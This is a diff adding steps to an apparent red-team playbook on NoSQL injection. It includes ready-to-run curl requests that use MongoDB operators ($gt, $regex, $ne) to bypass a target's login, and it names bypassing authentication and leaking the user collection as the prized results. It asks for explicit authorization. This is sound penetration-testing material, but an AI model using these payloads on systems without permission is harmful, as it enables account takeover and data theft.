@@ -10,6 +10,42 @@ tags: [nosql, injection, hunt, redteam]
 
 # HUNT-NOSQLI — NoSQL Injection
 
+## When to Use
+
+- Target uses MongoDB/Mongoose, CouchDB, Redis.
+- Shows NoSQL error messages.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Operator injection in JSON body
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+
+# Regex wildcard — match any username
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
+
+# ne (not equal) bypass
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": {"$ne": "wrong"}}'
+# ... (continues in Procedure)
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).
